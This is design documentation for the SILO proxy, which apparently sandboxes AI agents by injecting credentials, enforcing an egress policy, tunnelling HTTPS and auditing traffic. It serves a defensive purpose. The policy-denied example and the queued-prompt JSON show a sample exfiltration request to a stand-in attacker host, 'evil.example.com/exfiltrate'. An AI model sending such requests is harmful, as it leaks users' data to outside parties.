# Proxy & Networking

> Internals of the SILO inference proxy, credential injection, CONNECT tunnels, and network architecture.

---

## Overview

The SILO inference proxy is a lightweight HTTP proxy server that runs on the host machine. It serves as the **sole gateway** between the sandboxed agent and the outside world.

**Key responsibilities:**
1. Route LLM requests from the container to the real LLM provider
2. Route integration requests to third-party APIs (Slack, GitHub, etc.)
3. Inject API credentials (which the container never sees)
4. Evaluate every request against the active egress policy
5. Record every request in the JSONL audit trail
6. Support CONNECT tunnels for policy-allowed HTTPS destinations
7. Expose a health check endpoint for auto-restart detection

---

## Proxy Architecture

```
┌─────────────────────────────────────┐
│  Sandbox Container                  │
│                                     │
│  http_proxy=http://llm.gateway:8199 │
│                                     │
│  Agent code → HTTP request          │
└──────────────┬──────────────────────┘
               │
               │  http://llm.gateway:8199/v1/chat/completions
               │  (llm.gateway resolves to host IP via --add-host)
               ▼
┌──────────────────────────────────────────────────────────────┐
│  PROXY SERVER  (port 8199, host machine)                     │
│                                                              │
│  ┌─────────────────┐  ┌───────────────┐  ┌──────────────┐  │
│  │ Request Router   │  │ Policy Gate   │  │ Audit Logger │  │
│  │                  │  │               │  │              │  │
│  │ Is llm.gateway?  │  │ evaluate()    │  │ append()     │  │
│  │ → forwardProvider│  │ → allow/deny  │  │ → audit.jsonl│  │
│  │                  │  │ → interceptor │  │              │  │
│  │ Is /_silo/health?│  │               │  │              │  │
│  │ → health JSON    │  │               │  │              │  │
│  │                  │  │               │  │              │  │
│  │ Other host?      │  │               │  │              │  │
│  │ → policy check   │  │               │  │              │  │
│  └─────────────────┘  └───────────────┘  └──────────────┘  │
│                                                              │
│  ┌──────────────────────────────┐                           │
│  │ Provider Routing             │                           │
│  │                              │                           │
│  │ OpenAI    → api.openai.com   │                           │
│  │ Anthropic → api.anthropic.com│                           │
│  │ Local     → localhost:11434  │                           │
│  │                              │                           │
│  │ + Auth header injection      │                           │
│  │ + Auth header stripping      │                           │
│  └──────────────────────────────┘                           │
└──────────────────────────────────────────────────────────────┘
```

---

## Request Flow

### LLM Requests (to `llm.gateway`)

1. Agent sends `POST http://llm.gateway:8199/v1/chat/completions`
2. Proxy recognises `llm.gateway` via regex: `/^llm\.gateway(:\d+)?$/`
3. **Auth header stripping** — removes `authorization`, `x-api-key`, etc. from container headers
4. **Credential injection** — based on configured provider:
   - OpenAI: `Authorization: Bearer sk-...`
   - Anthropic: `x-api-key: sk-ant-...` + `anthropic-version: 2023-06-01`
   - Local: `Authorization: Bearer <key>` (omitted if key is `"local"`)
5. **Host rewriting** — rewrites `Host` header to the real provider hostname
6. **HTTPS upgrade** — forwards using HTTPS to `api.openai.com` or `api.anthropic.com`
7. **Response streaming** — streams the response back to the container without buffering
8. **Token extraction** — buffers a copy of the response body to extract token usage (OpenAI `usage.prompt_tokens`/`completion_tokens`, Anthropic `usage.input_tokens`/`output_tokens`)
9. **Audit entry** — records method, host, URL, category=`llm`, verdict, status code, latency, model, token usage

### Integration Requests (to `<service>.gateway`)

1. Agent sends `POST http://slack.gateway:8199/chat.postMessage`
2. Proxy matches the hostname against configured integrations via `findIntegration()`
3. **Auth header stripping** — removes all auth headers from container request
4. **Credential injection** — based on configured auth type:
   - Bearer: `Authorization: Bearer <token>`
   - Header: `<authHeader>: <token>` (e.g. `x-api-key: <token>`)
   - Query: `?<param>=<token>` appended to the URL
5. **Extra headers** — injects any configured extra headers (e.g. GitHub's `x-github-api-version`)
6. **Host rewriting** — rewrites `Host` header to the real API hostname
7. **HTTPS upgrade** — forwards using HTTPS to the upstream API
8. **Response streaming** — streams the response back to the container
9. **Audit entry** — records with category=`integration`, service name, and verdict

### Policy-Allowed Egress (e.g. `pypi.org`)

1. Agent sends `GET http://pypi.org/simple/requests/` (via `http_proxy`)
2. Proxy extracts hostname from the URL
3. **Policy evaluation** — `evaluate(policy, "pypi.org")` → `"allow"`
4. **Forward** — proxies the request to the real destination
5. **Audit entry** — records with category=`egress`, verdict=`allow`

### Policy-Denied Request (e.g. `evil.example.com`)

1. Agent sends `POST http://evil.example.com/exfiltrate`
2. **Policy evaluation** — `evaluate(policy, "evil.example.com")` → `"deny"`
3. **Interceptor** triggered:
   - TTY mode: User sees approve/deny prompt directly in the terminal.
   - Non-TTY mode (Prompt IPC Loop): If a foreground Prompt Listener (from `silo run` or `silo connect`) is active and polling, the request is queued for up to 30 seconds to allow interactive resolution. Otherwise, it is auto-denied.
4. If denied: Returns HTTP 403 `Blocked by SILO policy: evil.example.com`
5. **Audit entry** — records with category=`blocked`, verdict=`deny`

### CONNECT Tunnels (HTTPS)

1. Agent sends `CONNECT api.github.com:443` (HTTPS tunnel request)
2. Proxy extracts host and port
3. **Special case:** CONNECT to `llm.gateway` is **rejected** (HTTP 400) — forces plain HTTP for LLM calls
4. **Special case:** CONNECT to any integration gateway (e.g. `slack.gateway`) is also **rejected** (HTTP 400)
5. **Policy evaluation** — `evaluate(policy, "api.github.com")`
5. If allowed: Establishes TCP socket to `api.github.com:443` and pipes data bidirectionally
6. **Audit entry** — recorded at tunnel establishment

---

## Provider Routing

The `resolveProviderTarget()` function maps the configured LLM provider to its upstream URL and auth headers:

### OpenAI

| Field | Value |
|---|---|
| Base URL | `https://api.openai.com` (or custom `baseUrl`) |
| Auth Header | `Authorization: Bearer <apiKey>` |
| API Path | `/v1/chat/completions`, `/v1/models`, etc. |

### Anthropic

| Field | Value |
|---|---|
| Base URL | `https://api.anthropic.com` (or custom `baseUrl`) |
| Auth Headers | `x-api-key: <apiKey>`, `anthropic-version: 2023-06-01` |
| API Path | `/v1/messages` |

### Local (Ollama, LM Studio, vLLM)

| Field | Value |
|---|---|
| Base URL | `http://localhost:11434` (or custom `baseUrl`) |
| Auth Header | `Authorization: Bearer <apiKey>` (omitted if apiKey is `"local"`) |
| API Path | Provider-dependent (OpenAI-compatible format) |

---

## Stripped Request Headers

For security, the proxy strips the following headers from container requests **before** injecting real credentials:

| Header | Reason |
|---|---|
| `authorization` | Prevents Bearer token forgery |
| `x-api-key` | Prevents Anthropic key forgery |
| `api-key` | Prevents Azure OpenAI key forgery |
| `openai-api-key` | Prevents alternative key header forgery |
| `anthropic-api-key` | Prevents alternative key header forgery |

Additionally stripped:
- `host` — rewritten to the real provider hostname
- `proxy-connection` — proxy hop header
- `proxy-authorization` — proxy auth header

---

## Daemon API Endpoints

### Health Check (`GET /_silo/health`)

The proxy exposes `/_silo/health` for liveness monitoring:

```bash
curl http://127.0.0.1:8199/_silo/health
```

Response:
```json
{
  "status": "ok",
  "pid": 48291,
  "uptimeMs": 123456
}
```

This endpoint is used by:
- `silo connect` — to verify proxy health before opening a shell
- `silo run` — to verify proxy health before starting an agent task
- `ensureProxyRunning()` — the auto-restart mechanism

### Prompt IPC - List Prompts (`GET /_silo/prompts`)

Used by the foreground Prompt Listener (CLI commands like `silo run`/`connect`) to retrieve any pending policy approval requests queued in the proxy interceptor.

Both prompt endpoints are operator-only. Requests must come from host loopback, use origin-form paths, and carry the header `x-silo-control-token` with the value from `~/.silo/proxy-control.token`. The daemon generates that token (mode `0600`) on every start and deletes it on shutdown. Anything else gets `403`, and an unauthorised poll does not count as an active listener.

Response:
```json
[
  {
    "id": "abc123xyz",
    "method": "POST",
    "url": "http://evil.example.com/exfiltrate",
    "host": "evil.example.com",
    "timestamp": "2026-05-22T00:00:00.000Z"
  }
]
```

### Prompt IPC - Submit Decision (`POST /_silo/prompts/:id/decision`)

Used by the foreground Prompt Listener to submit the operator's decision for a queued prompt ID.

Request Body:
```json
{
  "decision": "allow_once" | "allow_always" | "deny"
}
```

Any other `decision` value is rejected with `400`.

Response:
```json
{
  "success": true
}
```

---

## Daemon Process Management

### Spawning

The proxy daemon is spawned by `silo start` as a **detached child process**:

```typescript
const child = spawn(isTs ? "npx" : "node", args, {
  detached: true,
  stdio: "ignore",
  env: { ...process.env },
});
child.unref();
```

- `detached: true` — the daemon becomes the leader of a new process group
- `child.unref()` — allows the CLI process to exit without waiting
- `stdio: "ignore"` — the daemon has no terminal I/O

### Startup Health-Check Loop

To guarantee the proxy daemon is fully booted and responsive before returning control to the CLI, SILO runs a health-check polling loop instead of a static sleep timer. It polls `GET /_silo/health` every 100ms for up to 5 seconds. If the health check does not pass within this timeout, or the child process terminates early, the CLI kills the process (if still alive) and exits with an error.

### PID File

The daemon writes its PID to `~/.silo/proxy.pid` on startup and clears it on shutdown.

| Operation | Function |
|---|---|
| Write PID | `writePid(pid)` |
| Read PID | `readPid()` → `number | null` |
| Clear PID | `clearPid()` |
| Check liveness | `isProxyAlive()` — sends signal 0 to the PID |
| Stop daemon | `stopProxyProcess()` — SIGTERM → wait 5s → SIGKILL |

### Signal Handling

| Signal | Action |
|---|---|
| `SIGTERM` | Graceful shutdown: log `session_stop` event, close server, clear PID file, exit |
| `SIGINT` | Same as SIGTERM |
| `SIGHUP` | Hot-reload the policy from disk without restarting |

### Auto-Restart

When `silo connect` or `silo run` is executed, `ensureProxyRunning()` performs:

1. Check if the PID file contains a valid, alive process
2. If alive, send a health check to `/_silo/health`
3. If healthy → proceed normally
4. If alive but unresponsive → SIGKILL the old process, respawn
5. If dead → respawn the daemon

---

## Network Architecture

### SILO Docker Bridge

```bash
# All platforms
docker network create \
  --driver bridge \
  --internal \
  --label managed-by=silo \
  silo-sandbox-net
```

SILO creates this as an internal bridge on **every platform**. The `--internal` flag is the critical network isolation mechanism:
- ❌ No default NAT gateway → containers cannot reach the internet directly
- ❌ No outbound routing without explicit proxy configuration
- ✅ Container-to-container communication is possible
- ✅ The proxy is reachable through a platform-specific gateway path (below)

### Proxy Reachability

How sandboxes reach the host-side proxy depends on the platform:

**Native Linux (`host-gateway` mode).** Internal bridges still permit host↔container traffic, so `--add-host llm.gateway:host-gateway` maps the alias straight to the host IP where the proxy listens.

**Docker Desktop on macOS/Windows (`sidecar` mode).** Containers run inside a VM, and an internal network has no route back to the host. SILO runs a minimal `socat` relay container (`silo-gateway`, from the `alpine/socat` image) attached to **both** the internal sandbox network and the default bridge. On the sandbox network it carries the DNS aliases `llm.gateway` plus one per integration gateway (`slack.gateway`, …); it relays TCP to the host proxy via `host.docker.internal`. The HTTP `Host` header passes through the relay untouched, so the proxy distinguishes gateways exactly as it does on Linux. The sidecar is hardened like the sandbox itself (non-root, read-only, `--cap-drop ALL`, pids/memory limits) and is created, reused, and torn down automatically by `silo start` / `silo stop`.

In both modes:

1. `llm.gateway` resolves only to the proxy path — never to the public internet
2. `http_proxy` / `https_proxy` environment variables tell HTTP clients to use the proxy
3. Port `8199` is the default proxy listening port

```
Sandbox (internal net, no NAT)
  ↓                          ↓
Linux: llm.gateway →        macOS/Windows: llm.gateway →
host-gateway (host IP)      silo-gateway sidecar → host.docker.internal
  ↓                          ↓
        SILO Proxy Server on the host (:8199)
```

### Traffic Flow Diagram

```
Container HTTP request
  ↓
http_proxy env var (set by SILO)
  ↓
DNS: llm.gateway → host-gateway (Docker resolves to host IP)
  ↓
TCP connection to host:8199
  ↓
SILO Proxy Server
  ├─ Policy check
  ├─ Credential injection (for LLM)
  ├─ Audit logging
  └─ Forward to upstream
     ↓
Real destination (api.openai.com, pypi.org, etc.)
```

---

## Token Usage Parsing

The proxy extracts token usage from LLM responses for audit purposes:

### OpenAI Format (Non-Streaming)

```json
{
  "usage": {
    "prompt_tokens": 100,
    "completion_tokens": 50,
    "total_tokens": 150
  }
}
```

### Anthropic Format

```json
{
  "usage": {
    "input_tokens": 100,
    "output_tokens": 50
  }
}
```

### SSE Streaming

For streaming responses, the proxy walks backwards through the last few `data:` lines of the SSE stream to find the usage chunk (OpenAI includes it in the final chunk when `stream_options.include_usage` is set).

---

## Configuration

| Setting | Source | Default |
|---|---|---|
| Proxy port | `config.proxy.port` | `8199` |
| LLM provider | `config.llm.provider` | Set during `silo onboard` |
| API key | `config.llm.apiKey` | Set during `silo onboard` |
| Model | `config.llm.model` | Set during `silo onboard` |
| Base URL | `config.llm.baseUrl` | Per-provider default |

---

*SILO v0.2.0 — Secure AI Agent Sandbox Orchestrator*
